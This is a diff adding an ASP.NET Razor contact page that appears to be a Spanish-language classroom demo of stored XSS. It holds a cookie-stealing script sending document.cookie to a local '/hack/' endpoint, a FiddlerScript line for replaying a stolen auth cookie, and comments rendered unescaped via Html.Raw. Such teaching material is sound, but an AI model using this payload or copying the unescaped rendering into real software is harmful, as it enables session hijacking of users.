@@ -1,0 +1,39 @@
+﻿@{
+    ViewBag.Title = "Contact";
+    ViewBag.Script = "<script>image = new Image(); image.src='http://localhost:50666/hack/?cookie='+document.cookie;</script>";
+}
+<h2>@ViewBag.Title.</h2>
+<h3>@ViewBag.Message</h3>
+
+<address>
+    One Microsoft Way<br />
+    Redmond, WA 98052-6399<br />
+    <abbr title="Phone">P:</abbr>
+    425.555.0100
+</address>
+
+<address>
+    <strong>Support:</strong>   <a href="mailto:Support@example.com">Support@example.com</a><br />
+    <strong>Marketing:</strong> <a href="mailto:Marketing@example.com">Marketing@example.com</a>
+</address>
+
+<hr />
+<strong>Comentarios:</strong>
+<p>Los comentarios permiten código HTML. Por desgracia, también permitimos cosas como la siguiente: @ViewBag.Script</p>
+<p>En el evento OnBeforeRequest de FiddlerScript meteríamos lo siguiente: oSession.oRequest["Cookie"] = (oSession.oRequest["Cookie"] + ".AspNet.ApplicationCookie=XXX");</p>
+<hr />
+
+@foreach (var item in ViewBag.Comments)
+{
+    @Html.Raw(@item)
+    <hr />
+}
+
+<form method="post">
+    <div class="form-group">
+        <label for="Comment">Comentario:</label>
+        <textarea class="form-control" id="Comment" name="Comment" rows="7" style="min-width: 50%"></textarea>
+    </div>
+
+    <input type="submit" value="Enviar" class="btn btn-secondary" />
+</form>
